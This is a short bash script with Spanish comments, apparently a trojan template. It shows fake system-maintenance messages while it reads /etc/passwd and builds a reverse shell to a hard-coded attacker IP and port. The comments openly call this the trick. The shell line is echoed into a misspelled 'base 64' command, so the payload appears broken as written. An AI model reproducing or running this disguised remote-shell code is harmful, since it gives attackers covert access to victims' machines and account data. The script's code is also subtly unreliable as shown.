#!/bin/bash
# AQUÍ ESTÁ EL TRUCO: Pon tu IP de atacante fija
IP_ATACANTE="192.168.1.109"
PUERTO=4444

echo "Iniciando mantenimiento del sistema..."
cat /etc/passwd | head -n 5
echo "Procesando paquetes..."

# Ejecutamos la reverse shell hacia TU IP (192.168.1.109)
echo "bash -i >& /dev/tcp/$IP_ATACANTE/$PUERTO 0>&1 &" | base 64

sleep 2
echo "Actualización completada."
